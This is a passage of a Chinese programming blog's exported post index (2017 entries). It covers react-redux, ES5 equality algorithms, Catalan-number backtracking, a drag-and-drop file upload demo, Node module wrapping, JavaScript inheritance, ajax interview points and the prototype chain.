        <tag>BAT</tag>
        <tag>深度优先搜索</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-redux学习笔记]]></title>
    <url>%2F2017%2F07%2F07%2Freact-redux-note%2F</url>
    <content type="text"><![CDATA[note:这是一篇随意的不能更随意的学习随笔使用action创建函数封装逻辑是react与redux配合的最佳实践： 当所有的逻辑都被转移到redux之后，react就可以只负责渲染界面并发起action创建函数了ActionCreator要返回一个action对象，那么它是如何处理复杂的逻辑的呢？ —&gt; 中间件 发起一个action创建函数，只需要将其返回结果传给dispatch()为什么使用redux thunk?该中间件可以让action创建函数先不返回action对象，而是一个函数： 通过这个函数： 接收store的两个方法dispatch和getState作为参数，延迟dispatch或只在满足指定条件情况下dispatch如何激活redux thunk中间件？在createStore中加入参数：applyMiddleware(thunk) 将redux手动连接到react组件，即不使用react-redux: 更新方法：store.subscribe(render) 为什么要使用react-redux? 手动的缺点： 1.无法直接给组件传递state和方法 2.任意的state变化都会导致整个组件树的重新渲染，没有性能优化 react-redux优势： 不仅可以给组件树中的任一组件绑定state和方法，还进行了性能优化，避免了不必要的重新渲染 使用react-redux： 1.在所有组件的顶层使用Provider组件给整个程序提供store 原理：通过context将store专递给子组件 store是一个包含三个函数的对象，三个函数分别是：subscribe，dispatch，getState Provider中重新定义了componentWillReceiveProps，检查每次渲染时代表store的prop和上一次是否一样，如果不一样则给出警告 2.使用connect()将state和action创建函数绑定到组件中，接收两个参数 第一个参数: 函数，参数为state，通过返回一个对象，将state或其某些属性合并到组件props的相应的属性中 第二个参数：对象或函数。分别有四种情况： 对象，是所有actionCreator的集合，将所有actionCreator传到组件的同名属性，并为每个actionCreator隐式绑定dispatch方法； 函数，参数为dispatch,返回的对象会被自动合并到组件的props中，但不会自动为actionCreator绑定dispatch方法，需手动绑定 函数，参数为dispatch,返回值使用redux的bindActionCreators()来减少样板代码:bindActionCreators(ActionCreators, dispatch) 为空，组件自己使用dispatch发起action 注：除了以上写法外，connect还有装饰器写法 3.并不是所有的组件都需要连接redux，理解容器组件和展示组件的差异性，connect相当于是对容器组件和展示组件的一个连接 源码分析： 顶层组件provider 12345678910111213class Provider extends Component &#123; ··· getChildContext () &#123; store: this.props.store &#125; render () &#123; return this.props.children &#125; ···&#125;Provider.childContextTypes = &#123; store: PropType.object&#125; 底层组件如何使用Context 模块化应用： 状态树的设计原则 1.一个模块控制一个节点 2.避免数据冗余 3.树形结构扁平 单一数据源原则：对于嵌套过深的数据结构（状态树）问题，先定义多个reducer对数据进行拆解访问／修改再通过combineReducers函数将零散的数据拼装回来的方法。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>react</tag>
        <tag>redux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es5中‘==’与‘===’算法的实现]]></title>
    <url>%2F2017%2F06%2F21%2Fes-equite%2F</url>
    <content type="text"><![CDATA[1 “===“The comparison x === y, where x and y are values, produces true or false. Such a comparison is performed as follows: If Type(x) is different from Type(y), return false. If Type(x) is Undefined, return true. If Type(x) is Null, return true. If Type(x) is Number, then If x is NaN, return false. If y is NaN, return false. If x is the same Number value as y, return true. If x is +0 and y is −0, return true. If x is −0 and y is +0, return true.Return false. If Type(x) is String, then return true if x and y are exactly the same sequence of characters (same length and same characters in - corresponding positions); otherwise, return false. If Type(x) is Boolean, return true if x and y are both true or both false; otherwise, return false. Return true if x and y refer to the same object. Otherwise, return false. 2 “==“The comparison x == y, where x and y are values, produces true or false. Such a comparison is performed as follows: If Type(x) is the same as Type(y), then If Type(x) is Undefined, return true. If Type(x) is Null, return true. If Type(x) is Number, then If x is NaN, return false. If y is NaN, return false. If x is the same Number value as y, return true. If x is +0 and y is −0, return true. If x is −0 and y is +0, return true. Return false. If Type(x) is String, then return true if x and y are exactly the same sequence of characters (same length and same characters in corresponding positions). Otherwise, return false. If Type(x) is Boolean, return true if x and y are both true or both false. Otherwise, return false. Return true if x and y refer to the same object. Otherwise, return false. If x is null and y is undefined, return true. If x is undefined and y is null, return true. If Type(x) is Number and Type(y) is String, return the result of the comparison x == ToNumber(y). If Type(x) is String and Type(y) is Number, return the result of the comparison ToNumber(x) == y. If Type(x) is Boolean, return the result of the comparison ToNumber(x) == y. If Type(y) is Boolean, return the result of the comparison x == ToNumber(y). If Type(x) is either String or Number and Type(y) is Object, return the result of the comparison x == ToPrimitive(y).If Type(x) is Object and Type(y) is either String or Number, return the result of the comparison ToPrimitive(x) == y.Return false. NOTE 1 Given the above definition of equality: String comparison can be forced by: “” + a == “” + b. Numeric comparison can be forced by: +a == +b. Boolean comparison can be forced by: !a == !b. NOTE 2 The equality operators maintain the following invariants: A != B is equivalent to !(A == B). A == B is equivalent to B == A, except in the order of evaluation of A and B. NOTE 3 The equality operator is not always transitive. For example, there might be two distinct String objects, each representing the same String value; each String object would be considered equal to the String value by the == operator, but the two String objects would not be equal to each other. For Example: new String(“a”) == “a” and “a” == new String(“a”)are both true. new String(“a”) == new String(“a”) is false. NOTE 4 Comparison of Strings uses a simple equality test on sequences of code unit values. There is no attempt to use the more complex, semantically oriented definitions of character or string equality and collating order defined in the Unicode specification. Therefore Strings values that are canonically equal according to the Unicode standard could test as unequal. In effect this algorithm assumes that both Strings are already in normalised form.]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>es5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运动员分组问题：如何分组使得中位数之和最大]]></title>
    <url>%2F2017%2F05%2F19%2Fbacktracking-code%2F</url>
    <content type="text"><![CDATA[题目来自牛客网上某大厂实习生在线笔试做的一道编程题。上一篇博文（ 《回溯法打印卡特兰数问题》 ）中给出了子问题的解决算法。这里给出完整题目和代码。题目就贴截图好了：更多卡特兰数算法题请戳这篇： 《二叉搜索树形态问题–从一道算法题探讨神奇的Catalan数》 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556var readline = require('readline');const rl = readline.createInterface(&#123; input: process.stdin, output: process.stdout, terminal:false&#125;);var n = -1;// 初始状态为负数，表示还没开始读取var res = 0;rl.on('line', function(line)&#123; // javascript每行数据的回调接口 if (n &lt; 0) &#123; // 测试用例第一行读取n n = parseInt(line.trim()) &#125; else &#123; var tokens = line.split(' ').map(function (x) &#123; return parseInt(x); &#125;); var arr=tokens.sort(sortNumber); //将数列从小到大排序 var hm=arr.slice(n); //获取[n+1,3n]顺序区间内的数列 catalanSort(hm,[],[],0); console.log(res); &#125;&#125;);function sortNumber(a,b) &#123; return a-b&#125;function catalanSort(arr,firstLine,secondLine,i)&#123; //firstLine存储各分组的中位数 var n=arr.length/2; if(firstLine.length==n) &#123; //搜索到叶子节点，得到一组符合条件的中位数 res=getSum(firstLine)&gt;res?getSum(firstLine):res; //判断该组中位数之和是否最大 &#125; else &#123; for (var j = 0; j &lt; 2; j++) &#123; if (j == 0) &#123; firstLine.push(arr[i]); &#125; else &#123; secondLine.push(arr[i]); &#125; if (firstLine.length &gt;= secondLine.length) &#123; //约束条件判断 catalanSort(arr,firstLine,secondLine,i+1); //符合条件，扩展搜索空间 &#125; //回溯前，清除上一步占用的空间状态 if(j==0)&#123; firstLine.pop(); &#125;else&#123; secondLine.pop(); &#125; &#125; &#125;&#125;function getSum(arr)&#123; //计算数组中所有项之和 return arr.reduce(function(x,y)&#123; return parseInt(x)+parseInt(y); &#125;);&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>卡特兰数</tag>
        <tag>算法</tag>
        <tag>回溯</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[回溯法打印卡特兰数问题]]></title>
    <url>%2F2017%2F05%2F19%2Fbacktracking-catalan%2F</url>
    <content type="text"><![CDATA[今天在牛客上做到一个题，用到了卡特兰数的知识。(之前专门写了一篇文章讲解卡特兰数，传送门)那道题我会单独写一篇博客，这里把其中一个子问题抽象出来，给出代码方案：给了长度为2n的顺序数列，先将数列分成两排，要求第一排的每一列小于等于对应的第二排的数字，每排顺序排列，打印出所有排序方案。 这里我用回溯方法解决，对所有方案进行深度优先遍历，如果‘0的数量大于1’（为什么？还是刚才那个传送门： 4.3.4 卡特兰数排队问题 ）,则返回上层。这里我构造了两个空数列：firstLine和secondLine，从头到尾遍历长度为2n的原数组arr，每次都有两个选择方案：将arr[i]放入到firstLine或secondLine。怎么放呢？没关系，我们先进行遍历，按顺序来，如果放入后firstLine的长度大于等于secondLine，则进入下层循环。另外，为了保证回溯，一定要记得及时清理状态，在每次循环后将两个数组的状态返回为上一层的样子。 代码如下：1234567891011121314151617181920212223242526function catalanSort(arr,firstLine,secondLine,i)&#123; var n=arr.length/2; if(firstLine.length==n) &#123; //搜索到叶节点，输出一个结果 console.log(firstLine); &#125; else &#123; for (var j = 0; j &lt; 2; j++) &#123; //枚举所有可能的路径 if (j == 0) &#123; firstLine.push(arr[i]); &#125; else &#123; secondLine.push(arr[i]); &#125; //判断是否满足约束条件 if (firstLine.length &gt;= secondLine.length) &#123; //满足条件，扩展搜索空间 catalanSort(arr,firstLine,secondLine,i+1); &#125; //回溯前的清理工作：清除所占的状态资源 if(j==0)&#123; firstLine.pop(); &#125;else&#123; secondLine.pop(); &#125; &#125; &#125;&#125; 调用方式就是：1catalanSort(arr,[],[],0)]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>卡特兰数</tag>
        <tag>算法</tag>
        <tag>回溯</tag>
        <tag>面试</tag>
        <tag>BAT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端页面文件拖拽上传模块html/css/js代码示例]]></title>
    <url>%2F2017%2F05%2F18%2Fweb-drag%2F</url>
    <content type="text"><![CDATA[缘起最近给卫生局做一个表格上传/可视化系统，算是小有成果。今天把项目中的文件拖拽上传模块分离出来，做了一个独立的小demo,并把相关代码打包上传到了我的github中，为了其他学习者和开发者提供拙见。 gitHub地址：https://github.com/Julyaan/dragToUpload 功能清单由于代码中我的注释很详尽，所以具体逻辑实现及不介绍了，大家直接看代码及能明白。现在简单列一个功能清单和一些用到的知识点清单： 模态框 文件的批量上传 使用formData API 封装数据 并通过ajax方法提交 读取拖放文件，ondrop事件 dataTransfer对象 清空所有文件 知识点 单例模式：构建一个单例模式的formData容器 事件冒泡，事件委托：动态添加删除单个文件的方法 css各种布局，BFC CSS 伪类 link vistied hover active html 离线操作文档：创建fragment 离线操作，提高性能，减少浏览器的重绘和回流 原型链，原型方法：为formData对象添加一个删除所有文件的方法 CSS伪对象，结合after伪对象画一个‘X’号，放在模态框右上角表示退出按钮 界面展示整体界面点击‘拖拽上传’按钮拖拽文件到虚线框，文件拖入会边框变红提示上传成功，弹出提示 —————————-、 代码展示 html:12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;link rel="stylesheet" href="demo.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;!--遮罩--&gt; &lt;div class="overlay"&gt;&lt;/div&gt; &lt;!--模态框--&gt; &lt;div id="modal" class="dropbox"&gt; &lt;div class="items-container"&gt; &lt;div id="close" style="cursor:pointer;float: right;width:20px"&gt; &lt;span class="css-close"&gt;&lt;/span&gt; &lt;/div&gt; &lt;div&gt; &lt;p class="head"&gt;&lt;b&gt;拖拽文件至此&lt;/b&gt;&lt;/p&gt; &lt;div class="content" id="content"&gt; &lt;table class="table"&gt; &lt;tbody class="tbody"&gt;&lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;button class="btn" onclick="upload()"&gt;开始上传&lt;/button&gt; &lt;/div&gt; &lt;a href='#' onclick='clearAll()' style='position:absolute;bottom:10px;right:30px;'&gt;清空所有&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--页面内容--&gt; &lt;div style="margin-top:40vh;text-align: center;"&gt; &lt;p&gt;拖拽上传演示模板。点击下方按钮，弹出模态框&lt;/p&gt; &lt;button class="btn" onclick="showModal()"&gt;点击上传&lt;/button&gt; &lt;/div&gt; &lt;!--嵌入脚本--&gt; &lt;script src="jquery-1.10.2.js" type="text/javascript"&gt;&lt;/script&gt; &lt;script src="demo.js" type="text/javascript"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; CSS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899.overlay&#123; z-index: 99; position:fixed; display: none; top:0; left:0; width: 100%; height: 100%; background-color: #333; opacity:0.5;&#125;.dropbox&#123; z-index: 100; display: none; position: fixed; width:500px; height:520px; margin:auto; top:0; right:0; bottom: 0; left:0; background-color: #fff; border-radius:6px; transition-duration: 0.9s; -webkit-transition-duration: 0.9s; overflow:hidden; text-align: center;&#125;.items-container&#123; padding: 10px;&#125;.content&#123; border: 3px dashed gray; border-radius: 10px; margin: 10px 20px; height:400px; overflow: auto; padding:2px 8px;&#125;.head&#123; margin:0px; font-size:30px; color:#aaa;&#125;.footer&#123; margin:5px auto&#125;.btn&#123; border-radius: 20px; box-sizing: border-box; border-width: 2px; background-color: transparent; font-size: 14px; font-weight: 500; padding: 7px 18px&#125;/*画一个叉号，表示推出界面*/.css-close&#123;display:inline-block; width:15px; height:2px; background:#000; font-size:0; line-height:0;vertical-align:middle;-webkit-transform: rotate(45deg);&#125;.css-close:after &#123; content:'.'; display:block; width:15px; height:2px; background:#000;-webkit-transform: rotate(90deg);&#125;/*表格样式*/.table&#123; width:100%; border-collapse: collapse;&#125;#content tr:first-child td&#123; border-top-width: 0px;&#125;#content tr td:last-child&#123; cursor: pointer; color: red;&#125;#content tr td&#123; padding: 8px; white-space: nowrap; overflow: hidden; text-overflow:ellipsis; border-top:1px solid #9A9A9A;&#125;#content tr:hover&#123; background-color: #d5d5d5;&#125;#content tr:active&#123; background-color: #9A9A9A;&#125;a:link&#123; color:blue;&#125;a:visited&#123; color:blue;&#125;a:hover&#123; color:blue;&#125;a:active&#123; color:red;&#125; js代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129function showModal() &#123; //打开上传框 var modal = document.getElementById('modal'); var overlay = document.getElementsByClassName('overlay')[0]; overlay.style.display = 'block'; modal.style.display = 'block';&#125;function closeModal() &#123; //关闭上传框 var modal = document.getElementById('modal'); var overlay = document.getElementsByClassName('overlay')[0]; overlay.style.display = 'none'; modal.style.display = 'none';&#125;//用DOM2级方法为右上角的叉号和黑色遮罩层添加事件：点击后关闭上传框document.getElementsByClassName('overlay')[0].addEventListener('click', closeModal, false);document.getElementById('close').addEventListener('click', closeModal, false);//利用html5 FormData() API,创建一个接收文件的对象，因为可以多次拖拽，这里采用单例模式创建对象Dragfilesvar Dragfiles=(function ()&#123; var instance; return function()&#123; if(!instance)&#123; instance = new FormData(); &#125; return instance; &#125;&#125;());//为Dragfiles添加一个清空所有文件的方法FormData.prototype.deleteAll=function () &#123; var _this=this; this.forEach(function(value,key)&#123; _this.delete(key); &#125;)&#125;//添加拖拽事件var dz = document.getElementById('content');dz.ondragover = function (ev) &#123; //阻止浏览器默认打开文件的操作 ev.preventDefault(); //拖入文件后边框颜色变红 this.style.borderColor = 'red';&#125;dz.ondragleave = function () &#123; //恢复边框颜色 this.style.borderColor = 'gray';&#125;dz.ondrop = function (ev) &#123; //恢复边框颜色 this.style.borderColor = 'gray'; //阻止浏览器默认打开文件的操作 ev.preventDefault(); var files = ev.dataTransfer.files; var len=files.length, i=0; var frag=document.createDocumentFragment(); //为了减少js修改dom树的频度，先创建一个fragment，然后在fragment里操作 var tr,time,size; var newForm=Dragfiles(); //获取单例 var it=newForm.entries(); //创建一个迭代器，测试用 while(i&lt;len)&#123; tr=document.createElement('tr'); //获取文件大小 size=Math.round(files[i].size * 100 / 1024) / 100 + 'KB'; //获取格式化的修改时间 time = files[i].lastModifiedDate.toLocaleDateString() + ' '+files[i].lastModifiedDate.toTimeString().split(' ')[0]; tr.innerHTML='&lt;td&gt;'+files[i].name+'&lt;/td&gt;&lt;td&gt;'+time+'&lt;/td&gt;&lt;td&gt;'+size+'&lt;/td&gt;&lt;td&gt;删除&lt;/td&gt;'; console.log(size+' '+time); frag.appendChild(tr); //添加文件到newForm newForm.append(files[i].name,files[i]); //console.log(it.next()); i++; &#125; this.childNodes[1].childNodes[1].appendChild(frag); //为什么是‘1’？文档里几乎每一样东西都是一个节点，甚至连空格和换行符都会被解释成节点。而且都包含在childNodes属性所返回的数组中.不同于jade模板&#125;function blink()&#123; document.getElementById('content').style.borderColor = 'gray';&#125;//ajax上传文件function upload()&#123; if(document.getElementsByTagName('tbody')[0].hasChildNodes()==false)&#123; document.getElementById('content').style.borderColor = 'red'; setTimeout(blink,200); return false; &#125; var data=Dragfiles(); //获取formData $.ajax(&#123; url: 'upload', type: 'POST', data: data, async: true, cache: false, contentType: false, processData: false, success: function (data) &#123; alert('succeed!') //可以替换为自己的方法 closeModal(); data.deleteAll(); //清空formData $('.tbody').empty(); //清空列表 &#125;, error: function (returndata) &#123; alert('failed!') //可以替换为自己的方法 &#125; &#125;);&#125;// 用事件委托的方法为‘删除’添加点击事件，使用jquery中的on方法$(".tbody").on('click','tr td:last-child',function()&#123; //删除拖拽框已有的文件 var temp=Dragfiles(); var key=$(this).prev().prev().prev().text(); console.log(key); temp.delete(key); $(this).parent().remove();&#125;);//清空所有内容function clearAll()&#123; if(document.getElementsByTagName('tbody')[0].hasChildNodes()==false)&#123; document.getElementById('content').style.borderColor = 'red'; setTimeout(blink,300); return false; &#125; var data=Dragfiles(); data.deleteAll(); //清空formData //$('.tbody').empty(); 等同于以下方法 document.getElementsByTagName('tbody')[0].innerHTML='';&#125; 项目地址完整的代码在：https://github.com/Julyaan/data-VA.git]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
        <tag>CSS</tag>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node中javascript模块的编译原理]]></title>
    <url>%2F2017%2F05%2F15%2Fnode-module%2F</url>
    <content type="text"><![CDATA[众说周知，Node中的模块是根据CommonJS规范来实现的，但是，Node是实现过程中也对规范进行了一定的取舍。尽管规范中exports,require和module听起来十分简单，但是Node在实现过程中经历了什么，还是值得进一步思考和探索的。 本篇博客是本人阅读朴灵的《深入浅出理解NodeJS》一书的一篇读书笔记。主要记录下自己在阅读JS模块编译部分章节的一点心得。 Node中，每个文件模块都是一个对象，理解这一点就好了。具体的模块编译，这本书的第2章讲解的特别棒，推荐有兴趣的人去阅读下，这里就不再总结了。 之前我一直有个疑惑，每个模块文件中都存在 require,exports,module这些变量，但是并没有看到它们在哪定义的。估计大部分人都产生过这样的疑惑，而这本书给了我们详尽的解答。 事实上，编译过程中，Node会对获取的Javascript文件进行头尾包装： 123456789(function(exports,require,module,_filename,_dirname)&#123;\\----------头部-------------..文件中的js代码..\\----------尾部--------------&#125;); 对了，filename和 dirname 也是‘自带’的两个属性。 通过这种方法，每个模块文件之间都进行了作用域隔离。接下来，包装之后的代码会通过VM原生模块的runInThisContext()方法执行，该方法类似eval()，只是具有明确的上下文，无污染全局。 该方法会返回一个具体的function对象。最后，将该当前模块对象的exports属性，require()方法，module（即模块对象自身）以及文件定位中得到的完整的文件路径和目录作为参数传递给这个function（)执行。 执行之后，模块的exports属性被返回给了调用方，因此exports属性上的任何方法和属性都可以被外部调用到，但是模块中的其他属性或方法则不可直接调用。 以上就是Node中js模块化的实现原理。 另外，还应注意一个细节： 尽管exports也是直接被返回的属性，但是一定要通过module.exports来添加属性或方法，直接用exports通常会得到失败的结果。 为什么呢？这里贴一下node官方文档： 可以看到，最终返回的是exports对象是通过形参传入的，直接赋值形参，只会改变形参的引用，Module.exports才是真正的接口，exports只不过是它的一个辅助工具。最终返回给调用的是Module.exports而不是exports。如果module.exports本身不具备任何属性和方法，exports收集到的属性和方法，会赋值给了Module.exports。如果，Module.exports已经具备一些属性和方法，那么exports收集来的信息将被忽略。 比如：foo.js12module.exports = &#123;a: 2&#125;exports.a = 1 test.js12var f=require(./foo);console.log(f.a); // 2 可见，exports在module.exports 被改变后，失效。 总结一下exports和module.exports的区别：1.module.exports 初始值为一个空对象 {}2.exports 是指向的 module.exports 的引用3.require() 返回的是 module.exports 而不是 exports 所以在实际使用中，我们最好按照官方的说明：ignore exports and only use module.exports]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>JavaScript</tag>
        <tag>模块化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解JavaScript中所谓的‘寄生组合式继承’]]></title>
    <url>%2F2017%2F05%2F11%2Fjs-extend%2F</url>
    <content type="text"><![CDATA[最近又反复阅读了《js高级程序设计》上对js继承的介绍，然后在掘金上也看到篇比较深刻的介绍js类与继承的博文，所以来谈下自己的理解。先贴下那篇博文:JavaScript 的继承与多态再贴两篇能够更深刻地帮助理解js对象模型的文章：1.js运算符instanceof的工作原理2.JavaScript对象模型-执行模型 看完以上文章你应该能easy地解释这两行代码为什么会这样输出：12Function instanceof Object //trueObject instanceof Function //true 基本的方法就不说了，原型链啊，借用构造函数啊，组合式啊，寄生（分离）式啊，以及各自的优缺点啊，内部constructor,prototype,[[prototype]]这些指针的指向以及意义啊，这些都是必须掌握的。 在这篇文章，我想讨论目前为止，最好的继承实现方法——这里暂且不讨论es6、7中的类与继承——寄生组合式继承。 其实最迷惑初学者的是，同样的原理，实现同样的功能，却有五花八门的实现方法和叫法，所以会误以为是有好多种方法。我最开始学习时，就进入了这样一种误区，然后回去记忆这些不同的方法，导致在用的时候总会混淆。现在看来，真的好蠢，为什么不花点时间好好琢磨下原理呢？这样没准你自己也能写一套独有的‘最优方法’呢。 闲话说多了，进入正题。首先，为什么要用寄生组合式呢？组合是指什么？弄清第一个问题很容易，自己去翻看《js高级程序设计》第6章就好了。那组合指的是什么？我的理解就是这两部分的组合：构造函数属性的继承和建立子类和父类原型的链接。 1.构造函数属性的继承在子类中调用超类的构造函数：1SuperType.apply(this,arguments) 2.建立子类和父类原型的链接最简单的方法就是用Object.create()方法对父类的原型进行浅复制，赋给子类原型：1SubType.prototype=Object.create(SuperType.prototype); 如果仅仅是这样，SubType.prototype.constructor指向的还是Supertype(但并不影响instanceof，为什么？戳《js运算符instanceof的工作原理》),最好，在进行增强原型：1SubType.prototype.constructor = SubType; 那么使用Object.create的原型链是什么样的呢？其实很简单：1SubType.prototype.__ proto __ = SuperType.protype 也就是说，子类的原型相当于是父类原型的一个实例，这不就是实现了两者的链接了吗？相比之前的原型链继承方法：SubType.prototype=new SuperType()；这里没有创建构造函数；相比之前的经典组合式继承，不必在调用子类构造函数时再重写超类的实例属性（因为压根就没有继承过），也就是相当于，去掉了无用的、会被覆盖掉的一部分代码，因此这种方法被认为是继承的最佳实现。 另外，红宝书上在介绍寄生组合继承时引入了一个函数：12345function inheritPrototype(subType,superType)&#123; var prototype=object(superType.prototype) //object()方法是ES5前Object.create()的非规范化实现，后面会给出代码以及二者的比较 prototype.constructor = subType; //增强对象 subType.prototype = prototype; //指定对象&#125; 其实就是把上面的两个语句整合在了一个函数里面而已，换汤不换药。下面给出object()方法：12345function object(o)&#123; function F()&#123;&#125; F.prototype = o; return new F();&#125; 返回的是F（）的一个实例，那这个实例会有一个 proto 指针，这个指针指向F.prototype, 也就是o, 所以 跟刚才Object.creat()的用法是相同的功能。 说了这里，不得不再来聊一下历史。这个object（）方法是道格拉斯·克罗克福德在2006年发表的一篇题为Prototypal Inheritance in JavaScript中提出的（大牛啊，再瞧瞧我们现在水的那些所谓的“学术型”论文，汗颜啊）。后来ECMAScript5 通过新增Object.create()方法规范化了这种继承方式。在传入一个参数的情况下，Object.create()方法和object()方法的行为相同，不同的是Object.create()可以接收可选参数[propertiesObject],该参数对象是一组属性与值，该对象的属性名称将是新创建的对象的属性名称，值是属性描述符（这些属性描述符的结构与Object.defineProperties()的第二个参数一样）,具体请戳MDN-Object.creat()方法 因此，这里我们可以将inheritPrototype（）中第一条语句改为1var prototype=Object.create(SuperType.prototype) 那么最终的实现方法是：12345678910function SuperType(name)&#123; this.name=name;&#125;SuperType.prototype.sayName=function()&#123;console.log(this.name)&#125;function SubType(name,age)&#123; SuperType.call(this,name); this.age=age;&#125;inherit(SubType,SuperType);]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试ajax考点汇总]]></title>
    <url>%2F2017%2F05%2F08%2Ffe-ajax%2F</url>
    <content type="text"><![CDATA[Ajax(Asynchronous JavaScript and XML)是一系列web开发技术的集合，使用很多的web技术在客户端开发异步web应用。利用Ajax，web应用可以异步的发送数据获取数据，而不干扰现有页面的显示和行为。通过解耦数据接口层和展现层，Ajax允许web页面或者其他扩展的web应用动态的改变数据而不用重新加载整个页面。实现通常选择JSON代替XML，因为更接近JavaScript。 Ajax不是一种技术，是一组技术。这里我总结了一些偏基础的ajax面试考点,其中一部分也是自己在面试中遇到过的。 手写一个ajax get方法12345678910var xhr=new XMLHttpRequest();xhr.onreadystatechange=function()&#123; if(xhr.readyState == 4)&#123; if(xhr.status&gt;=200 &amp;&amp;xhr.status&lt;300 || xhr.status == 304)&#123; console.log(xhr.responseText); &#125; &#125;&#125;xhr.open('get','https://www.baidu.com',true);xhr.send(Null); 考点： 收到响应后，响应的数据会自动填充XHR对象的属性，因此readState、status和responseText属性要通过xhr去拿，而不是 回调函数的参数！ 这是很多人容易 犯的一个错误。回调函数传回来的是event对象，该对象的target属性指向的次啊是XMLHttpRequest实例。最好也不要通过this去获取，因为作用域问题，有的浏览器中会报错，因此为了可靠，应使用xhr对象来获取这些属性。 readyState属性都代表什么？0：未初始化。尚未调用open()方法；1：启动。已经调用open()方法，但是未调用send()方法；2：发送。已经调用send()方法，但尚未接收到响应；3：接收。已经接收到部分响应数据；4：完成。已经接收到全部响应数据。 只要readyState属性的值由一个变成另一个，就会触发一个readystatechange事件，因此最好在open()之前制定onreadystatechange事件处理程序。 设置头部信息使用setRequestHeader()方法设置自定义的请求头部信息。如：xhr.setRequestHeader(‘MyHeader’,’MyValue’);必须在open()方法之后，send()方法之前调用。 post请求，发生表单数据方法一：首先设置Content-Type头部信息为application/x-www-form-urlencoded;然后对表单进行序列化处理，创建一个字符串，最后发送字符串： 1234xhr.open('post','/posturl',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');var form=document.getElementById('form');xhr.send(serialize(form)); 方法二：使用FormData对象，该方法不必设置请求头部。1234var data= new FormData();data.append('name','value');//也可以通过项构造函数传表单元素var data=new FormDate(document.forms[0]) append()方法接收两个参数：键和值。 XMLHttpRequest 2级 formData 超时设定xhr.timeout = 1000xhr.ontimeout= function(){} load事件xhr.onload=function(){}该方法在接收到完整的响应数据时触发 abort事件调用abort()方法触发 progress事件该事件在接收响应期间持续触发 123xhr.onload=function(event)&#123;&#125; event包含三个额外的属性：lengthComputable、position和totalSize，分别表示进度信息是否可用（boolean），已经接收的字节数和总字节数（根据响应头部中的Content-Length获取）]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>Ajax</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[由一道js题探讨构造函数、prototype和__proto__之间的关系]]></title>
    <url>%2F2017%2F05%2F02%2Fjs-prototype%2F</url>
    <content type="text"><![CDATA[javascript原型世界还是挺有意思的，这篇文字主要是在借助chrome浏览器’剖跟溯源’，大家可以直接跳到文末看结论。 缘起今天在牛客上看到这样一个题：1234var F = function()&#123;&#125;;Object.prototype.a = function()&#123;&#125;;Function.prototype.b = function()&#123;&#125;;var f = new F(); 问：能否通过f取到方法a，方法b? 刨根在git上看到有人画了这么一个图： 你如果理不清prototype，_proto _，construcor这些概念和关系，会觉得这副图很杂乱。这里，我将根据自己的理解和实验，重新画一幅图。画之前，先总结下自己对这些概念的理解： prototype是每个函数默认会拥有的一个属性，该属性是一个指针，指向一个原型对象，这个对象包含一个不可枚举的属性constructor，而constructor的值则是一个函数对象。当调用构造函数创建一个实例后，该实例也会包含一个内部属性，也是一个指针，指向构造函数的原型对象，es5中将该指针定义为[[prototype]]， proto 是FireFox,Safari和Chrome提供的该指针的非标准的访问方法，另外要说一句的是，[[prototype]]是一个内置属性，js通过该属性来寻找原型链，这个属性并不只是在实例对象中才存在的，每个对象中都会有（除了 Object.prototype . proto ， 一般地，认为：Object.prototype . proto =NULL）。 做一个测试：1234var F=function()&#123;&#125;;var p=F.prototype;var c=p.constructor;console.log(c===F) // ==&gt; true 回到题目中，现在chrome调试器中敲入题目中的代码，由于f是F的一个实例，因此， proto 指向F.prototype，另外由于js中所有引用类型都默认继承了Object，因此F.protoype中仍然包含 一个指针，为了弄清楚这个继承关系，我在控制台输入console.log(f. proto ) ： 果然，F.prototype里包含了两个默认属性，construcor和 proto 。可以看到construcor指向一个函数对象，而这个函数对象正是F，而F的prototype属性指向的Object正是F.prototype(哈哈，这大概不是废话)。根据继承的概念，那么这个 proto 应该指向父类的原型，也就是Object.prototype，这里验证一下：属性里包含a方法，因此可以肯定就是Object.prototype了，然后在观察它的constructor：正式Object的构造函数，里面也看到了很多熟悉的方法。 一个问题看到这里不免产生疑问 为什么Object的构造函数比原型多了这么多属性？getOwnPropertyNames()方法返回对象的所有属性（包括不可枚举类型）。测试发现Object.prototype中所有属性有13个（包括后来添加的a），而Object中包含25个 